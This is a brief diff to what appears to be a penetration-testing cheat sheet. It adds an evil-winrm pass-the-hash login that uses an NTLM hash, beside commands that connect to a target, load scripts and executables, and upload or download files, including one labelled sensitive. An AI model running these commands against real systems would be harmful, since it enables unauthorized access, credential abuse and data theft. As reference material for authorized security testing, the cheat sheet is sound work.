@@ -44,6 +44,9 @@ evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'
 evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /opt/tools/ps_scripts/
 evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -e /opt/tools/executables/
 
+# Pass-the-hash when only the NTLM hash is available.
+evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>
+
 # Inside Evil-WinRM.
 upload /local/file.exe C:\Temp\file.exe
 download C:\sensitive\file.txt /local/
